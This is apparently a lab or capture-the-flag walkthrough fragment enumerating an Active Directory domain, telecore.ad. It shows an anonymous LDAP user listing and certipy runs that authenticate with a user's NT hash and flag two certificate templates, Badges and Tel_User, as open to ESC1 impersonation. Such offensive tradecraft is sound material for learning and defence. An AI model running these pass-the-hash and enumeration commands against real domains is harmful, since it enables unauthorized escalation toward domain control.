
Find and analyze certificate templates that permit abuse for impersonation or escalation.

``` bash
─$ ldapsearch -x -H ldap://10.5.2.2 -b 'DC=TELECORE,DC=AD' 'objectClass=user' name distinguishedName  
# extended LDIF
#
# LDAPv3
# base <DC=TELECORE,DC=AD> with scope subtree
# filter: objectClass=user
# requesting: name distinguishedName 
#

# Guest, Users, telecore.ad
dn: CN=Guest,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=Guest,CN=Users,DC=telecore,DC=ad
name: Guest

# DC01, Domain Controllers, telecore.ad
dn: CN=DC01,OU=Domain Controllers,DC=telecore,DC=ad
distinguishedName: CN=DC01,OU=Domain Controllers,DC=telecore,DC=ad
name: DC01

# PKI-SRV, Win Servers, telecore.ad
dn: CN=PKI-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=PKI-SRV,OU=Win Servers,DC=telecore,DC=ad
name: PKI-SRV

# SQL-SRV, Win Servers, telecore.ad
dn: CN=SQL-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=SQL-SRV,OU=Win Servers,DC=telecore,DC=ad
name: SQL-SRV

# EX-SRV, Win Servers, telecore.ad
dn: CN=EX-SRV,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=EX-SRV,OU=Win Servers,DC=telecore,DC=ad
name: EX-SRV

# virt-admin, Users, telecore.ad
dn: CN=virt-admin,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=virt-admin,CN=Users,DC=telecore,DC=ad
name: virt-admin

# ESXI-VD, Win Servers, telecore.ad
dn: CN=ESXI-VD,OU=Win Servers,DC=telecore,DC=ad
distinguishedName: CN=ESXI-VD,OU=Win Servers,DC=telecore,DC=ad
name: ESXI-VD

# tel_ops1, Users, telecore.ad
dn: CN=tel_ops1,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_ops1,CN=Users,DC=telecore,DC=ad
name: tel_ops1

# tel_support01, Users, telecore.ad
dn: CN=tel_support01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_support01,CN=Users,DC=telecore,DC=ad
name: tel_support01

# tel_engineer01, Users, telecore.ad
dn: CN=tel_engineer01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_engineer01,CN=Users,DC=telecore,DC=ad
name: tel_engineer01

# tel_billing01, Users, telecore.ad
dn: CN=tel_billing01,CN=Users,DC=telecore,DC=ad
distinguishedName: CN=tel_billing01,CN=Users,DC=telecore,DC=ad
name: tel_billing01
```




```bash
certipy-ad find -u 'tel_engineer01' -hashes 'e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[-] Got error: cannot import name 'CertificateIssuerPublicKeyTypes' from 'cryptography.hazmat.primitives.asymmetric.types' (/home/kali/.local/lib/python3.13/site-packages/cryptography/hazmat/primitives/asymmetric/types.py)
[-] Use -debug to print a stacktrace
                                                                                                                                                                      
┌──(adrts)─(kali㉿kali)-[~/machines/adrts/exploits]
└─$ certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes 'e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[-] Got error: cannot import name 'CertificateIssuerPublicKeyTypes' from 'cryptography.hazmat.primitives.asymmetric.types' (/home/kali/.local/lib/python3.13/site-packages/cryptography/hazmat/primitives/asymmetric/types.py)
[-] Use -debug to print a stacktrace
                                                                                                                                                                           
┌──(adrts)─(kali㉿kali)-[~/machines/adrts/exploits]
└─$ certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes ':e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[-] Got error: cannot import name 'CertificateIssuerPublicKeyTypes' from 'cryptography.hazmat.primitives.asymmetric.types' (/home/kali/.local/lib/python3.13/site-packages/cryptography/hazmat/primitives/asymmetric/types.py)
[-] Use -debug to print a stacktrace
                                                                                                                                                                           
┌──(adrts)─(kali㉿kali)-[~/machines/adrts/exploits]
└─$ certipy-ad find -u 'tel_engineer01@telecore.ad' -hashes ':e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[-] Got error: cannot import name 'CertificateIssuerPublicKeyTypes' from 'cryptography.hazmat.primitives.asymmetric.types' (/home/kali/.local/lib/python3.13/site-packages/cryptography/hazmat/primitives/asymmetric/types.py)
[-] Use -debug to print a stacktrace
                                                                                                                                                                           
┌──(adrts)─(kali㉿kali)-[~/machines/adrts/exploits]
└─$ ../adrts/bin/certipy find -u 'tel_engineer01@telecore.ad' -hashes ':e2b1996aaff0f57bccb916265a77970e' -dc-ip 10.5.2.2 -enabled -vuln -ldap-scheme ldap -stdout  
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 0 OIDs linked to templates
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[*] Retrieving CA configuration for 'telecore-PKI-SRV-CA' via RRP
[-] Failed to connect to remote registry: [Errno Connection error (PKI-Srv.telecore.ad:445)] [Errno -2] Name or service not known
[-] Use -debug to print a stacktrace
[!] Failed to get CA configuration for 'telecore-PKI-SRV-CA' via RRP: 'NoneType' object has no attribute 'request'
[!] Use -debug to print a stacktrace
[!] Could not retrieve configuration for 'telecore-PKI-SRV-CA'
[*] Checking web enrollment for CA 'telecore-PKI-SRV-CA' @ 'PKI-Srv.telecore.ad'
[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[!] DNS resolution failed: The resolution lifetime expired after 5.403 seconds: Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.; Server Do53:10.5.2.2@53 answered The DNS operation timed out.
[!] Use -debug to print a stacktrace
[!] Failed to resolve: PKI-Srv.telecore.ad
[!] Error checking web enrollment: [Errno -2] Name or service not known
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : telecore-PKI-SRV-CA
    DNS Name                            : PKI-Srv.telecore.ad
    Certificate Subject                 : CN=telecore-PKI-SRV-CA, DC=telecore, DC=ad
    Certificate Serial Number           : 35DFAB7883C30297420CBFD2E33CB408
    Certificate Validity Start          : 2025-08-21 07:41:20+00:00
    Certificate Validity End            : 2125-08-21 07:51:20+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Unknown
    Request Disposition                 : Unknown
    Enforce Encryption for Requests     : Unknown
    Active Policy                       : Unknown
    Disabled Extensions                 : Unknown
Certificate Templates
  0
    Template Name                       : Badges
    Display Name                        : Badges
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-09-06T17:33:55+00:00
    Template Last Modified              : 2025-09-06T17:34:15+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
      Object Control Permissions
        Owner                           : TELECORE.AD\Administrator
        Full Control Principals         : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Owner Principals          : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Dacl Principals           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
                                          TELECORE.AD\tel_admin01
        Write Property Enroll           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
  1
    Template Name                       : Tel_User
    Display Name                        : Tel_User
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication
                                          Secure Email
                                          Encrypting File System
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2025-08-22T08:02:50+00:00
    Template Last Modified              : 2025-08-22T08:02:52+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TELECORE.AD\tel_engineer01
                                          TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
      Object Control Permissions
        Owner                           : TELECORE.AD\Administrator
        Full Control Principals         : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Owner Principals          : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Dacl Principals           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Write Property Enroll           : TELECORE.AD\Domain Admins
                                          TELECORE.AD\Domain Users
                                          TELECORE.AD\Enterprise Admins
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users
                                          TELECORE.AD\tel_engineer01
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```
